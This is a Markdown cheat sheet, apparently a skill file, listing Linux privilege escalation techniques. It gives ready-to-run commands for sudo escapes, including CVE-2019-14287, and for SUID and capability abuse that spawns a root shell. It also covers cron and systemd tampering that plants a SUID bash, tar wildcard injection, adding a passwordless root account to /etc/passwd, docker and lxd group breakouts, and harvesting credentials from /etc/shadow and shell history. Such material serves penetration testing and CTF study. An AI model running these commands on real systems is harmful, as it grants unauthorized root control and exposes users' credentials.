---
name: linux-privesc
description: Linux privilege escalation — SUID, caps, cron, sudo, NFS, containers.
tags: [linux, privesc, sudo, suid]
---
# Linux privesc

## 60-second triage
- `id; sudo -l; uname -a; cat /etc/os-release; hostname; ip a; ss -tulpn`
- `find / -perm -4000 -type f 2>/dev/null`; `getcap -r / 2>/dev/null`
- `cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers --all`
- `ls -la /opt /srv /var/www /home/*`; `cat ~/.bash_history`
- `env; cat /etc/environment; ls -la /etc/profile.d`

## Sudo
- `sudo -l` → `(ALL) NOPASSWD: /usr/bin/vim` → `sudo vim -c ':!/bin/sh'`
- GTFOBins for every binary; `sudo -u#-1 /bin/bash` (CVE-2019-14287), `sudoedit` with EDITOR.
- `env_keep+=LD_PRELOAD`: compile a .so with `__attribute__((constructor))`.
- Wildcards: `sudo /usr/bin/awk 'BEGIN{system("/bin/sh")}'`.

## SUID / caps
- Unknown SUID: `strings -a $BIN | grep -iE 'system|popen|exec'`; `ltrace`.
- Classics: `find`, `nmap --interactive`, `less`, `more`, `awk`, `perl`, `python`, `cp`, `mv`.
- `cap_setuid+ep` → `python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'`; `cap_dac_read_search` → read `/etc/shadow`.

## Cron / systemd
- Writable script run by root: append `cp /bin/bash /tmp/b; chmod 4755 /tmp/b`.
- PATH hijack in cron: `PATH=/home/user:/usr/bin` + fake `tar`.
- Wildcard injection: `tar *` in /var/backups → `--checkpoint=1 --checkpoint-action=exec=sh p.sh`.
- systemd: writable `.service` → `ExecStart=/bin/sh -c '...'`; `systemctl daemon-reload`.

## Files & services
- `/etc/passwd` writable: add `pwn::0:0:root:/root:/bin/bash`, `su pwn`.
- NFS `no_root_squash`: mount, drop SUID bash, run on target.
- Writable `/etc/ld.so.conf.d/` + `ldconfig`.
- Docker group: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.
- `lxd` group: import a privileged image and mount the host.

## Hidden knowledge
- `pspy` catches short-lived root cron jobs you never see in crontab.
- Check `/proc/*/cmdline` for creds in arguments (`ps auxww`).
- `ss -tulpn` on localhost-only services (127.0.0.1:8080) — forward with ssh.
- Kernel exploits last: check `uname -r` against distro backports before running a random CVE.
- `sudo -l` with `SETENV` → `sudo FOO=bar cmd`; with `!env_reset` → `LD_PRELOAD`.
